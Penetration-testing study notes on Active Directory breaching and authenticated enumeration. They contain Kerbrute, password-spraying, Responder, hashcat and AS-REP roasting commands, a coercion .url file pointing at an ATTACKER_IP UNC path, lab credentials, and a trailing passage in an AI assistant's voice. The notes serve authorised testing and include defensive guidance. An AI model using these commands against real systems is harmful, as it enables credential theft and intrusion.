

# Active Directory Breaching — Engagement Notes

## 1. Objective

**AD breaching** is the process of obtaining the first valid Active Directory credential from an unauthenticated starting position.

Once valid credentials are obtained, they can be used for:

* Domain enumeration
* SMB/LDAP/WinRM/RDP access
* Credential discovery
* Lateral movement
* Privilege escalation
* Access to higher-value systems and accounts

### Starting Positions

| Position                    | Description                                           |
| --------------------------- | ----------------------------------------------------- |
| Unauthenticated / Black-box | Network access but no valid AD credentials            |
| Authenticated / Grey-box    | Already possess a valid low-privileged domain account |

---

# 2. Initial AD Attack Surface

Common services to enumerate:

| Service    |   Port | Relevance                                             |
| ---------- | -----: | ----------------------------------------------------- |
| DNS        |     53 | Domain infrastructure discovery                       |
| Kerberos   |     88 | Username enumeration / authentication                 |
| LDAP       |    389 | Directory queries                                     |
| LDAPS      |    636 | Encrypted LDAP                                        |
| SMB        |    445 | Shares, authentication, administration                |
| HTTP/HTTPS | 80/443 | Internal portals, Git, Jenkins, management interfaces |

---

# 3. OSINT & Username Enumeration

## Objective

Build a list of potential domain usernames before attempting authentication.

Potential sources:

* Corporate websites
* LinkedIn
* GitHub/GitLab
* Job advertisements
* Public breach data
* Public documentation

Common username formats:

```text
first.last
firstlast
flast
first.l
first
last.first
```

Example:

```text
Jane Smith

jane.smith
janesmith
jsmith
jane.s
jane
smith.jane
```

---

## Kerberos Username Enumeration

**Tool:** Kerbrute

Kerberos behaves differently for valid and invalid usernames, allowing account existence to be identified without knowing the password.

Example:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
```

Save results:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

Look for:

```text
[+] VALID USERNAME: username@domain
```

### Important

Kerberos username enumeration generally does **not** count as a failed password authentication attempt and therefore does not normally trigger account lockouts.

However, authentication requests generate Windows event telemetry, including **Event ID 4768**, so this activity is not invisible.

---

# 4. DNS Enumeration

DNS is fundamental to AD because important infrastructure is registered through DNS.

### Domain Controllers

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
```

### Kerberos

```bash
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
```

### Mail Servers

```bash
nslookup -type=MX thm.loc 192.168.12.100
```

### Engagement Notes

Record:

```text
Domain:
Domain Controller:
Kerberos KDC:
DNS:
Mail server:
Other discovered hosts:
```

---

# 5. Credential Discovery

Credentials may be exposed through:

* Git repositories
* Git history
* Jenkins
* CI/CD pipelines
* Configuration files
* Network shares
* Internal documentation
* LDAP configurations
* SNMP configurations
* Source code
* Environment variables
* Build logs

MITRE ATT&CK:

```text
T1552 — Unsecured Credentials
```

---

## Git

Check:

* Current source
* Commit history
* Configuration files
* `.env`
* CI/CD definitions
* Hardcoded credentials

Manual search:

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

Automated:

```bash
trufflehog git file:///path/to/repo
```

### Important

Deleting a secret from the latest commit does **not** remove it from Git history.

---

# 6. Jenkins Credential Discovery

Potential locations:

* Build console output
* Job configuration
* `config.xml`
* Environment variables
* Workspace files
* Deployment scripts
* Build artifacts

Example:

```bash
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

Look for:

```text
username
password
token
API key
connection string
service account
deployment credential
```

---

# 7. Password Spraying

## Brute Force vs Password Spray

### Brute Force

One account:

```text
user → password1
user → password2
user → password3
...
```

High risk of account lockout.

### Password Spraying

One password across many accounts:

```text
user1 → password
user2 → password
user3 → password
...
```

Then move to the next password after an appropriate interval.

---

# 8. Determine Lockout Policy

If valid credentials are already available:

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

Record:

```text
Minimum password length:
Password history:
Lockout threshold:
Reset counter:
Lockout duration:
Password complexity:
```

### Operational Rule

Never blindly spray.

If:

```text
STATUS_ACCOUNT_LOCKED_OUT
```

appears, **stop** and reassess.

---

# 9. NetExec Password Spray

Clean Kerbrute output:

```bash
grep "VALID USERNAME" valid_users.txt | \
awk '{print $NF}' | \
sed 's/@thm.loc//' > clean_users.txt
```

Spray one password:

```bash
nxc smb 192.168.12.100 \
-u clean_users.txt \
-p 'MegaCorp01!' \
--continue-on-success
```

Optional jitter:

```bash
nxc smb 192.168.12.100 \
-u clean_users.txt \
-p 'MegaCorp01!' \
--continue-on-success \
--jitter 2-5
```

### Important Results

```text
[+]                       Valid credentials
STATUS_LOGON_FAILURE      Incorrect password
STATUS_ACCOUNT_DISABLED   Account disabled
STATUS_ACCOUNT_LOCKED_OUT Stop spraying
(Pwn3d!)                  Local administrator access
```

---

# 10. Authentication Coercion

MITRE ATT&CK:

```text
T1187 — Forced Authentication
```

Instead of discovering or guessing credentials, coercion attempts to make a victim system authenticate to infrastructure controlled by the tester.

Two covered techniques:

1. LDAP passback
2. File-based coercion

---

# 11. LDAP Passback

### Attack Concept

A network device such as a:

* Printer
* Scanner
* MFP
* IoT device

may contain LDAP credentials.

If the device uses plaintext LDAP, its LDAP connection can potentially be redirected to a tester-controlled listener.

### Attack Flow

```text
Access device admin panel
        ↓
Find LDAP configuration
        ↓
Replace LDAP server with tester IP
        ↓
Start listener
        ↓
Trigger "Test Connection"
        ↓
Capture LDAP credentials
        ↓
Validate credentials
```

Potential weaknesses:

* Default administrator credentials
* Weak device credentials
* Plaintext LDAP
* Overprivileged LDAP service account
* Long-lived service-account passwords

Example listener:

```bash
nc -lvnp 3489
```

The captured data may contain:

```text
DN / username
plaintext password
```

Validate obtained credentials:

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

### Limitation

If the device uses:

* LDAPS
* TLS
* SASL

a simple Netcat listener may not expose plaintext credentials.

---

# 12. File-Based Coercion

A writable SMB share can sometimes be abused to trigger Windows authentication.

A crafted `.url` file can reference an external UNC path:

```text
\\ATTACKER_IP\share\icon.ico
```

When Windows Explorer renders the file, it may attempt SMB authentication to the referenced host.

The resulting authentication material can contain a **Net-NTLMv2** challenge-response.

### Example `.url`

```ini
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\ATTACKER_IP\icons\icon.ico
IconIndex=1
```

The leading `@` in:

```text
@Shortcut.url
```

can make the file appear near the top of a directory listing.

---

# 13. Responder

Start Responder on the appropriate interface:

```bash
sudo responder -I tun0
```

Place the crafted file on the writable SMB share.

Example:

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%PASSWORD'
```

Then:

```text
put @Shortcut.url
```

When a victim accesses the share, monitor Responder for:

```text
NTLMv2-SSP Username
NTLMv2-SSP Hash
```

---

# 14. Net-NTLMv2 Hashes

Important distinction:

**LDAP passback**

```text
Potential plaintext credential
```

**File-based coercion**

```text
Net-NTLMv2 challenge-response
```

A Net-NTLMv2 hash is **not equivalent to a reusable NTLM password hash**.

It generally needs to be:

* Cracked offline, or
* Used in an appropriate relay scenario where conditions permit

---

# 15. Offline Cracking

Hashcat mode for Net-NTLMv2:

```text
5600
```

Example:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Successful cracking produces the plaintext password, which can then be validated against the appropriate AD service.

---

# 16. Advanced Coercion — Awareness

Additional techniques to research when appropriate:

```text
PetitPotam
PrinterBug / SpoolSample
DFSCoerce
```

These can potentially force high-value Windows systems to authenticate to attacker-controlled infrastructure.

Combined with relay attacks, coercion can form significant AD attack chains.

---

# 17. Engagement Workflow

### Phase 1 — Recon

```text
Identify domain
Identify DCs
Identify DNS
Identify SMB
Identify LDAP
Identify Kerberos
Identify HTTP/HTTPS
```

### Phase 2 — Username Discovery

```text
OSINT
    ↓
Username formats
    ↓
Username wordlist
    ↓
Kerbrute
    ↓
Validated accounts
```

### Phase 3 — Credential Discovery

```text
Git
Jenkins
SMB shares
Configuration files
Documentation
Device interfaces
```

### Phase 4 — Credential Validation

```text
NetExec
SMB
LDAP
WinRM
RDP
MSSQL
```

### Phase 5 — Password Spraying

```text
Determine lockout policy
        ↓
Select candidate password
        ↓
Spray one password
        ↓
Monitor results
        ↓
Stop if lockouts appear
```

### Phase 6 — Coercion

```text
Identify writable shares / vulnerable devices
        ↓
LDAP passback OR file-based coercion
        ↓
Capture authentication material
        ↓
Crack or relay where appropriate
        ↓
Validate recovered credentials
```

---

# 18. Defensive Checks

## Secrets

* Use a dedicated secrets manager.
* Scan repositories with secret-detection tooling.
* Audit Git history.
* Rotate exposed credentials.
* Prevent secrets from appearing in CI/CD logs.

## Passwords

* Use long passwords.
* Block common and organisation-specific passwords.
* Avoid shared default passwords.
* Configure sensible lockout policies.
* Monitor distributed authentication failures.

## Network Devices

* Change default credentials.
* Prefer LDAPS over plaintext LDAP.
* Restrict device management interfaces.
* Use dedicated low-privilege service accounts.
* Rotate service-account credentials.

## SMB / File Shares

* Apply least privilege.
* Minimise unnecessary write access.
* Monitor suspicious files such as `.url`, `.lnk`, `.scf`, and `desktop.ini`.
* Monitor unusual SMB authentication patterns.

## NTLM

* Disable NTLMv1.
* Prefer NTLMv2 where NTLM remains necessary.
* Enforce SMB signing.
* Restrict outbound SMB traffic.
* Plan migration away from NTLM where possible.

## Segmentation

Restrict access to:

* Domain controllers
* Jenkins
* Git servers
* Printer administration
* Management interfaces
* Other sensitive internal services

Use:

```text
VLAN segmentation
Firewall ACLs
MFA
Management networks
Least privilege
```

---

# Quick Engagement Checklist

```text
[ ] Identify domain
[ ] Identify DC
[ ] Identify DNS
[ ] Enumerate SMB
[ ] Enumerate LDAP
[ ] Enumerate Kerberos
[ ] Identify web services
[ ] Collect username candidates
[ ] Validate usernames with Kerberos
[ ] Search Git repositories
[ ] Search Jenkins
[ ] Check exposed configuration files
[ ] Check network shares
[ ] Identify credential leaks
[ ] Determine password policy
[ ] Perform controlled password spraying
[ ] Check printer/device LDAP configuration
[ ] Check writable SMB shares
[ ] Assess authentication coercion
[ ] Capture Net-NTLMv2 where authorised
[ ] Crack/relay where appropriate
[ ] Validate obtained credentials
[ ] Document every credential and access path
```

---

## Windows / Active Directory — Engagement-Ready Notes

### 1. Initial Network Recon

**Objective:** Identify live hosts and locate the Domain Controller (DC).

```bash
# Discover live hosts
fping -agq <SUBNET>/24

# Alternative
nmap -sn <SUBNET>/24

# Full TCP scan
nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
```

Create a target list:

```bash
cat hosts.txt
```

### 2. Identify the Domain Controller

Common AD ports:

| Port | Service            | Pentest relevance                        |
| ---: | ------------------ | ---------------------------------------- |
|   53 | DNS                | Domain/service discovery                 |
|   88 | Kerberos           | User enumeration, Kerberos attacks       |
|  135 | MS-RPC             | RPC enumeration                          |
|  139 | NetBIOS/SMB        | Legacy SMB                               |
|  389 | LDAP               | AD enumeration                           |
|  445 | SMB                | Shares, authentication, lateral movement |
|  464 | Kerberos password  | Password operations                      |
|  636 | LDAPS              | Encrypted LDAP                           |
| 3268 | Global Catalog     | AD enumeration                           |
| 3269 | Global Catalog SSL | Encrypted GC                             |

```bash
nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV -sC <DC_IP>
```

**DC indicators:**

* Kerberos on `88`
* LDAP/LDAPS on `389/636`
* SMB on `445`
* Domain name in LDAP banner
* Windows Server
* DNS/SRV records identifying the DC

---

## 3. SMB Enumeration

### Anonymous share enumeration

```bash
smbclient -L //<DC_IP> -N
```

```bash
smbmap -H <DC_IP>
```

Nmap:

```bash
nmap -p445 --script smb-enum-shares <DC_IP>
```

Look specifically for:

* `READ`
* `WRITE`
* Anonymous access
* Non-standard shares
* Backups
* Configuration files
* Scripts
* Documents containing credentials

### Connect to a share

```bash
smbclient //<DC_IP>/<SHARE> -N
```

Useful commands:

```text
ls
cd <directory>
get <file>
mget *
put <file>
```

With credentials:

```bash
smbclient //<DC_IP>/<SHARE> -U 'DOMAIN\username'
```

---

## 4. RPC Enumeration

Test anonymous/null session:

```bash
rpcclient -U "" <DC_IP> -N
```

Useful RPC commands:

```text
enumdomusers
enumdomgroups
querydominfo
getdompwinfo
netshareenum
```

Particularly useful:

```text
getdompwinfo
```

This can reveal:

* Minimum password length
* Complexity requirements
* Lockout-related information

---

## 5. LDAP Enumeration

Basic LDAP discovery:

```bash
ldapsearch -x -H ldap://<DC_IP> -s base
```

Once the domain is known:

```bash
ldapsearch -x -H ldap://<DC_IP> \
  -b "DC=domain,DC=local"
```

Useful targets:

* Users
* Groups
* Computers
* Service accounts
* Descriptions
* Email addresses
* SPNs
* Group memberships
* Password-related attributes accidentally exposed

---

# 6. DNS Enumeration

Identify domain infrastructure:

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN> <DC_IP>
```

Kerberos:

```bash
nslookup -type=SRV _kerberos._tcp.<DOMAIN> <DC_IP>
```

Mail:

```bash
nslookup -type=MX <DOMAIN> <DC_IP>
```

Also check:

```bash
dig @<DC_IP> <DOMAIN> ANY
dig @<DC_IP> _ldap._tcp.dc._msdcs.<DOMAIN> SRV
```

---

# 7. Username Enumeration

If Kerberos is exposed and you have a candidate username list:

```bash
kerbrute userenum \
  -d <DOMAIN> \
  --dc <DC_IP> \
  usernames.txt \
  -o valid_users.txt
```

Valid accounts are useful for:

* Authentication testing
* Password spraying
* AS-REP roasting checks
* Further AD enumeration

Extract usernames if necessary:

```bash
grep "VALID USERNAME" valid_users.txt
```

---

# 8. Credential Discovery

Prioritize exposed services and files.

### Git

Check:

* `.git`
* Commit history
* Configuration files
* `.env`
* Deployment scripts
* CI/CD definitions

```bash
git log -p
```

Search history:

```bash
git log -p | grep -iE \
'password|passwd|secret|token|apikey|credential'
```

Potential automated scanning:

```bash
trufflehog git file:///path/to/repo
```

### Jenkins / CI/CD

Check:

* Build console output
* Job configuration
* Environment variables
* Workspace files
* Deployment scripts
* Credentials referenced by pipelines

Look for:

```text
password
secret
token
API key
credential
username
connection string
```

**Engagement note:** A credential found in Git history should be treated as compromised even if it has subsequently been removed from the current branch.

---

# 9. Password Policy

If anonymous RPC access is permitted:

```bash
rpcclient -U "" <DC_IP> -N
```

Then:

```text
getdompwinfo
```

Alternatively, where permitted:

```bash
nxc smb <DC_IP> --pass-pol
```

Record:

```text
Minimum password length
Password complexity
Account lockout threshold
Lockout duration
Reset counter
Maximum password age
```

**Before authentication testing, understand the lockout policy.**

---

# 10. Password Spraying

**Password spraying ≠ brute forcing.**

| Technique      | Approach                     |
| -------------- | ---------------------------- |
| Brute force    | Many passwords → one account |
| Password spray | One password → many accounts |

For an authorized engagement, use a conservative approach based on the client's lockout policy.

Example:

```bash
nxc smb <TARGET> \
  -u users.txt \
  -p 'CandidatePassword!' \
  --continue-on-success
```

Potential result:

```text
[+] DOMAIN\username:password
```

Record successful credentials immediately and stop unnecessary authentication attempts.

**Never blindly spray without understanding the lockout policy.**

---

# 11. Post-Credential Enumeration

Once valid credentials are obtained, shift from **unauthenticated enumeration** to **authenticated enumeration**.

Examples:

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASS>' --shares
```

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASS>' --sessions
```

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASS>' --users
```

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASS>' --groups
```

Then investigate:

* Local administrator access
* SMB shares
* Interesting group membership
* Service accounts
* Kerberos SPNs
* Delegation
* AD CS
* GPOs
* ACLs
* Trust relationships
* Lateral movement opportunities

---

# 12. Engagement Evidence to Record

For every finding, record:

```text
Target:
IP:
Hostname:
Domain:
Port:
Service:
Account:
Access level:
Finding:
Evidence:
Command/tool:
Impact:
Recommended remediation:
```

Example:

```text
Finding: Anonymous SMB share access

Target: 10.x.x.x
Port: 445/tcp
Share: SharedFiles
Access: READ

Evidence:
Anonymous authentication succeeded and files were accessible.

Impact:
Unauthenticated users can access potentially sensitive corporate data.

Recommendation:
Disable anonymous SMB access and enforce least-privilege share permissions.
```

---

## AD Attack-Path Mindset

Keep this mental flow during an engagement:

```text
NETWORK
   ↓
HOST DISCOVERY
   ↓
PORT / SERVICE ENUMERATION
   ↓
DOMAIN / DC IDENTIFICATION
   ↓
SMB / LDAP / RPC / DNS
   ↓
USERNAME ENUMERATION
   ↓
CREDENTIAL DISCOVERY
   ↓
PASSWORD POLICY
   ↓
CONTROLLED AUTHENTICATION TESTING
   ↓
VALID AD CREDENTIALS
   ↓
AUTHENTICATED ENUMERATION
   ↓
ACLs / GROUPS / SPNs / GPOs / AD CS
   ↓
LATERAL MOVEMENT
   ↓
PRIVILEGE ESCALATION
   ↓
DOMAIN ADMIN / OBJECTIVE
```

**Key principle:** Establish the domain, identify the DC, enumerate exposed services, collect identities, discover credentials, and then build the attack path from evidence.

---


# Active Directory — Authenticated Enumeration

### Engagement Field Note

**Assessment phase:** Internal / AD Enumeration
**Access level:** Valid domain credentials
**Environment:** Windows Active Directory
**Primary objective:** Build an accurate picture of users, groups, computers, policies, delegation, and potential attack paths.

---

## 1. Engagement Context

Authenticated enumeration begins once valid domain credentials have been obtained.

Compared with unauthenticated enumeration, authenticated access exposes significantly more AD information, including:

* Domain users and attributes
* Group membership
* Computer accounts
* Administrative membership
* Password policy
* Service Principal Names (SPNs)
* Kerberos configuration
* Domain relationships
* Potential privilege relationships
* AD attack paths suitable for further validation

**Example lab credentials from the supplied material:**

```text
Domain:   tryhackme.loc
User:     asrepuser1
Password: qwerty123!
DC:       10.211.12.10
Workstation: 10.211.12.20
```

> For a real engagement, replace these with client-approved scope and credentials. Do not carry lab credentials into production notes.

---

# 2. Initial Validation

Before beginning enumeration, establish exactly what identity and host context you have.

### From Windows

```powershell
whoami
whoami /user
whoami /groups
whoami /priv
```

Useful questions:

| Question             | Command          |
| -------------------- | ---------------- |
| Current identity?    | `whoami`         |
| SID?                 | `whoami /user`   |
| Group memberships?   | `whoami /groups` |
| Assigned privileges? | `whoami /priv`   |

Also establish the domain:

```cmd
echo %USERDOMAIN%
echo %USERDNSDOMAIN%
```

---

# 3. AS-REP Roasting

## Objective

Identify accounts configured with:

```text
UF_DONT_REQUIRE_PREAUTH
```

These accounts do not require Kerberos pre-authentication, allowing an attacker to request an AS-REP response without first authenticating.

The resulting material can potentially be subjected to **offline password cracking**.

### Attack chain

```text
Enumerate users
      ↓
Identify accounts without Kerberos pre-auth
      ↓
Request AS-REP
      ↓
Obtain encrypted response
      ↓
Offline password cracking
      ↓
Validate recovered credential
      ↓
Continue authenticated enumeration
```

---

## Linux — GetNPUsers.py

Given a username list:

```bash
GetNPUsers.py tryhackme.loc/ \
    -dc-ip 10.211.12.10 \
    -usersfile users.txt \
    -format hashcat \
    -outputfile hashes.txt \
    -no-pass
```

### Important output

A vulnerable account may produce a hash beginning with:

```text
$krb5asrep$23$
```

Accounts without the vulnerable configuration produce messages such as:

```text
User <username> doesn't have UF_DONT_REQUIRE_PREAUTH set
```

---

## Offline cracking

The supplied room uses Hashcat mode:

```text
18200
```

Example:

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Engagement evidence to retain

Do **not** unnecessarily retain plaintext credentials in the final report.

Record:

```text
Account:
Domain:
AS-REP roastable: Yes/No
Hash obtained: Yes/No
Password recovered: Yes/No
Password validation: Yes/No
Impact:
```

---

# 4. ActiveDirectory PowerShell Module

The official Microsoft `ActiveDirectory` PowerShell module provides structured AD enumeration.

Check whether it is installed:

```powershell
Get-Module -ListAvailable ActiveDirectory
```

Import:

```powershell
Import-Module ActiveDirectory
```

---

# 5. User Enumeration

### Enumerate all domain users

```powershell
Get-ADUser -Filter *
```

For a concise list:

```powershell
Get-ADUser -Filter * |
    Select-Object Name,SamAccountName,Enabled
```

### Individual account

```powershell
Get-ADUser -Identity <username>
```

### All properties

```powershell
Get-ADUser -Identity <username> -Properties *
```

### High-value properties

The supplied material specifically highlights:

```text
LastLogonDate
MemberOf
Description
Title
PwdLastSet
```

Example:

```powershell
Get-ADUser -Identity Administrator `
    -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
```

---

## Targeted user searches

Find usernames containing `admin`:

```powershell
Get-ADUser -Filter "Name -like '*admin*'"
```

For engagement purposes, investigate:

* Disabled accounts
* Stale accounts
* Administrative accounts
* Unusual descriptions
* Service-related accounts
* Recently modified accounts
* Accounts with suspicious group membership

---

# 6. Group Enumeration

Enumerate all groups:

```powershell
Get-ADGroup -Filter *
```

Concise output:

```powershell
Get-ADGroup -Filter * |
    Select-Object Name
```

### Enumerate group membership

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

Other high-value groups include:

```text
Domain Admins
Enterprise Admins
Administrators
Backup Operators
Account Operators
Server Operators
Print Operators
Remote Desktop Users
Remote Management Users
```

The exact groups present should be established from the target environment rather than assumed.

---

# 7. Computer Enumeration

Enumerate domain computers:

```powershell
Get-ADComputer -Filter *
```

Useful condensed output:

```powershell
Get-ADComputer -Filter * |
    Select-Object Name,OperatingSystem
```

### Engagement questions

For every discovered computer, determine:

```text
Hostname
Operating system
Role
OU
Domain controller status
Last logon
SPNs
Delegation configuration
```

Example from the supplied material:

```powershell
Get-ADComputer -Filter *
```

The DC example contained:

```text
Name: DC
OperatingSystem: Windows Server 2019 Datacenter
DNSHostName: DC.tryhackme.loc
```

It also exposed:

```text
SERVER_TRUST_ACCOUNT
TRUSTED_FOR_DELEGATION
```

Those attributes are particularly important because delegation configuration can influence subsequent AD attack-path analysis.

---

# 8. Domain Password Policy

Use:

```powershell
Get-ADDefaultDomainPasswordPolicy
```

Important fields:

```text
ComplexityEnabled
MinPasswordLength
MaxPasswordAge
MinPasswordAge
PasswordHistoryCount
LockoutThreshold
LockoutDuration
LockoutObservationWindow
ReversibleEncryptionEnabled
```

### Example assessment table

| Property              |   Value | Assessment       |
| --------------------- | ------: | ---------------- |
| Complexity            |    True | Record           |
| Minimum length        |       7 | Potentially weak |
| Password history      |      24 | Record           |
| Maximum age           | 42 days | Record           |
| Lockout threshold     |       0 | Investigate      |
| Reversible encryption |   False | Positive         |

The actual values must come from the client's environment.

---

# 9. PowerView

PowerView is part of the PowerSploit framework and provides extensive domain reconnaissance functionality.

The supplied environment places the script under:

```text
C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon
```

Load it:

```powershell
Import-Module .\PowerView.ps1
```

---

# 10. PowerView — Users

Enumerate domain users:

```powershell
Get-DomainUser
```

Filter by username:

```powershell
Get-DomainUser *admin*
```

PowerView exposes considerably more raw AD attributes than a simple:

```cmd
net user /domain
```

This makes it useful when hunting for unusual account configurations.

---

# 11. PowerView — Groups

Enumerate groups:

```powershell
Get-DomainGroup
```

Filter:

```powershell
Get-DomainGroup "*admin*"
```

Look specifically at:

```text
member
description
admincount
samaccountname
objectsid
```

For privileged groups, map:

```text
Group → Members → Nested Groups → Users
```

---

# 12. PowerView — Computers

Enumerate domain computers:

```powershell
Get-DomainComputer
```

Useful attributes include:

```text
name
dnshostname
operatingsystem
serviceprincipalname
useraccountcontrol
lastlogon
pwdlastset
```

This is particularly valuable for identifying:

* Domain controllers
* Servers
* Workstations
* Service accounts represented through SPNs
* Delegation configurations

---

# 13. High-Value PowerView Queries

### Administrative accounts

```powershell
Get-DomainUser -AdminCount
```

This identifies users with:

```text
adminCount
```

set, which is an important indicator for privileged-account investigation.

---

### SPN-bearing accounts

```powershell
Get-DomainUser -SPN
```

These accounts have non-null Service Principal Names and should be reviewed as potential **Kerberoasting candidates**.

Record:

```text
Account
SPN
Service
Host
Privilege/group membership
```

Do not assume every SPN account is exploitable merely because an SPN exists.

---

# 14. Enumeration Workflow

For an engagement, I would keep the workflow structured rather than randomly executing commands.

```text
                    VALID CREDENTIAL
                          │
                          ▼
                  Identity Validation
                          │
                          ▼
                    Domain Discovery
                          │
             ┌────────────┼────────────┐
             ▼            ▼            ▼
           Users        Groups      Computers
             │            │            │
             └────────────┼────────────┘
                          ▼
                   Privilege Mapping
                          │
             ┌────────────┼────────────┐
             ▼            ▼            ▼
        Password       SPNs        Delegation
         Policy
             │            │            │
             └────────────┼────────────┘
                          ▼
                   Attack Path Review
                          │
             ┌────────────┼────────────┐
             ▼            ▼            ▼
           AS-REP     Kerberoast    BloodHound
```

---

# 15. BloodHound Preparation

The supplied room also identifies BloodHound as a major authenticated-enumeration capability.

The purpose is not simply to collect lists of objects, but to determine **relationships**.

Think:

```text
User
 ↓
Group membership
 ↓
Computer access
 ↓
Local administrator
 ↓
Session
 ↓
Delegation
 ↓
Domain privilege
```

Rather than asking:

> "What users exist?"

BloodHound allows you to ask:

> "What relationship connects this compromised account to a privileged target?"

That distinction is important during an engagement.

---

# 16. Attack-Path Prioritization

Once enumeration is complete, prioritize findings according to potential impact.

### Priority 1 — Direct privilege relationships

```text
Current user
   ↓
Privileged group
   ↓
Domain Admin / equivalent
```

### Priority 2 — Credential exposure

```text
Configuration files
Backup files
SMB shares
Scripts
Service credentials
```

### Priority 3 — Kerberos weaknesses

```text
AS-REP roastable accounts
        +
SPN-bearing accounts
```

### Priority 4 — Delegation

Review computers/accounts exhibiting delegation-related configuration.

### Priority 5 — Excessive permissions

Look for:

```text
Users with unnecessary admin rights
Groups with excessive membership
Workstations accessible by inappropriate users
Service accounts with excessive privileges
```

---

# 17. Engagement Evidence Checklist

For each enumeration phase, capture evidence rather than dumping everything indiscriminately.

### Domain

```text
[ ] Domain name
[ ] Forest/domain structure
[ ] Domain controllers
[ ] DNS names
[ ] Sites/OUs
```

### Users

```text
[ ] Total users
[ ] Enabled users
[ ] Disabled users
[ ] Privileged users
[ ] Service accounts
[ ] AS-REP candidates
[ ] Suspicious descriptions
[ ] Stale accounts
```

### Groups

```text
[ ] Domain Admins
[ ] Enterprise Admins
[ ] Administrators
[ ] Backup Operators
[ ] Other privileged groups
[ ] Nested memberships
```

### Computers

```text
[ ] Domain controllers
[ ] Servers
[ ] Workstations
[ ] Operating systems
[ ] SPNs
[ ] Delegation
```

### Policy

```text
[ ] Minimum password length
[ ] Complexity
[ ] Password history
[ ] Maximum password age
[ ] Lockout threshold
[ ] Lockout duration
[ ] Reversible encryption
```

---

# 18. Compact Command Reference

## Native AD module

```powershell
Import-Module ActiveDirectory

Get-ADUser -Filter *

Get-ADUser -Identity <USER> -Properties *

Get-ADUser -Filter "Name -like '*admin*'"

Get-ADGroup -Filter *

Get-ADGroupMember -Identity "Domain Admins"

Get-ADComputer -Filter *

Get-ADComputer -Filter * |
    Select Name,OperatingSystem

Get-ADDefaultDomainPasswordPolicy
```

## PowerView

```powershell
Import-Module .\PowerView.ps1

Get-DomainUser

Get-DomainUser *admin*

Get-DomainGroup

Get-DomainGroup "*admin*"

Get-DomainComputer

Get-DomainUser -AdminCount

Get-DomainUser -SPN
```

## AS-REP

```bash
GetNPUsers.py <DOMAIN>/ \
    -dc-ip <DC_IP> \
    -usersfile users.txt \
    -format hashcat \
    -outputfile hashes.txt \
    -no-pass
```

Offline validation/cracking in the lab:

```bash
hashcat -m 18200 hashes.txt <WORDLIST>
```

---

# 19. Findings to Look For

The enumeration itself isn't necessarily the finding. The important part is translating observations into security impact.

| Observation                        | Potential Finding                     |
| ---------------------------------- | ------------------------------------- |
| Pre-auth disabled                  | AS-REP Roasting exposure              |
| Weak password recovered            | Credential compromise                 |
| Excessive Domain Admin membership  | Excessive privilege                   |
| SPN on privileged account          | Kerberoasting exposure                |
| Sensitive data in shares           | Information disclosure                |
| Weak password policy               | Credential attack exposure            |
| Excessive workstation admin rights | Lateral movement risk                 |
| Dangerous delegation               | Privilege escalation risk             |
| Stale privileged accounts          | Account hygiene issue                 |
| Unnecessary service privileges     | Privilege escalation/lateral movement |

---

# 20. Recommended Engagement Notes Format

For each discovered issue, use a consistent record:

```text
Finding ID:
Title:
Severity:
Affected Asset:
Affected Account/Group:
Discovery Method:
Evidence:
Security Impact:
Attack Path:
Validation Performed:
Credentials Exposed: Yes/No
Privilege Obtained: Yes/No
Remediation:
Detection Recommendation:
```

### Example

```text
Finding ID: AD-001
Title: User account configured without Kerberos pre-authentication
Severity: High
Affected Account: <REDACTED>

Discovery Method:
GetNPUsers.py

Evidence:
Account returned an AS-REP response despite no authenticated
Kerberos pre-authentication.

Security Impact:
An attacker able to obtain the AS-REP material may perform
offline password guessing against the account.

Validation:
AS-REP material was obtained and tested offline.

Remediation:
Enable Kerberos pre-authentication unless there is a documented
business requirement for the exception. Ensure the account uses
a strong, unique password.

Detection:
Monitor unusual AS-REQ activity and investigate requests
associated with accounts configured without pre-authentication.
```

---
Absolutely. I’ll structure it in **two layers**:

1. **Engagement-ready note** — written like something you could actually keep in a pentest/Red Team engagement notebook: concise, operational, evidence-focused, and organized around objectives, prerequisites, commands, findings, and detection/mitigation.
2. **Cyber-student explanation** — then I’ll slow down and explain *why* each technique works, what is happening under the hood, and how the techniques chain together.

I’ll base the note on the material you provided rather than silently adding techniques that aren't covered there.

# 1. Engagement-Ready Lateral Movement Note

## Active Directory Lateral Movement

### Objective

Assess whether compromised credentials can be reused to move from an initial foothold to additional Windows hosts and ultimately reach Tier-0 assets such as the Domain Controller.

Primary techniques assessed:

* Remote execution via SMB/PsExec
* WinRM/Evil-WinRM
* Pass-the-Hash
* Credential reuse
* SSH pivoting/SOCKS
* Remote execution through a pivot
* Detection and defensive controls

---

## Initial Environment

| Host      | IP               | Role                            | Initial Access                  |
| --------- | ---------------- | ------------------------------- | ------------------------------- |
| WebServer | `192.168.13.71`  | Linux pivot / internal services | SSH                             |
| WRK       | `192.168.13.61`  | Windows workstation             | Local admin via `jdoe`          |
| SERVER1   | `192.168.13.51`  | Windows server                  | Remote Management Users         |
| ROOTDC    | `192.168.13.100` | Domain Controller               | Initially inaccessible directly |

Initial credentials:

```text
User: jdoe
Password: [credential obtained during engagement]
```

Network topology is segmented such that the AttackBox cannot directly reach some internal services, particularly the Domain Controller.

---

